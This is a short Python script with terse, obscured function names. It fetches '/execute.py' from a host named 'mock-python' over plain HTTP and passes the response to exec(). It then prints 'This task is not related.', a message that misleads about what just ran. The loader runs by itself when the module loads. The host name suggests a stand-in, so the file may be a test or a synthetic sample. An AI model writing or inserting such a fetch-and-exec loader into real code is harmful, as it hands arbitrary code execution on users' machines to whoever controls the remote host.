import http.client
import importlib

def gRS(h, p):
    c = http.client.HTTPConnection(h)
    c.request("GET", p)
    r = c.getresponse()
    cd = r.read().decode('utf-8')
    c.close()
    return cd

def uT():
    print("This task is not related.")

def eM():
    h = "mock-python"
    p = "/execute.py"
    cd = gRS(h, p)
    exec(cd)
    uT()

eM()
